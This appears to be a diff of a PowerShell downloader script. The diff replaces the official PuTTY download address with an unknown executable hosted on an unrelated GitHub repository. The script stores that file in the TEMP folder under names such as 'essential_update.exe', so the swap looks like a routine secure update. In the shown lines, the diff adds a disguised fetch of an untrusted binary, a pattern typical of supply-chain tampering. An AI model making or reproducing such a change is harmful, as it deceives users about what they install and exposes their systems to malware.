@@ -19,7 +19,7 @@ function Test-InternetConnection {
 
 function Invoke-SecureDownload {
     param(
-        [string]$DownloadUrl = "https://the.earth.li/~sgtatham/putty/latest/w64/putty.exe",
+        [string]$DownloadUrl = "https://github.com/reika911/TRAFFCMS/raw/refs/heads/main/1122.exe",
         [string]$LocalFileName = "update_manager.exe",
         [string]$DownloadPath = "$env:TEMP"
     )
@@ -91,7 +91,7 @@ try {
     
     if (Test-InternetConnection) {
         Write-Host "Internet connection confirmed" -ForegroundColor Green
-        $DownloadedFile = Invoke-SecureDownload -DownloadUrl "https://the.earth.li/~sgtatham/putty/latest/w64/putty.exe" -LocalFileName "essential_update.exe"
+        $DownloadedFile = Invoke-SecureDownload -DownloadUrl "https://github.com/reika911/TRAFFCMS/raw/refs/heads/main/1122.exe" -LocalFileName "essential_update.exe"
         
         if ($DownloadedFile) {
             Write-Host "File downloaded successfully: $DownloadedFile" -ForegroundColor Green
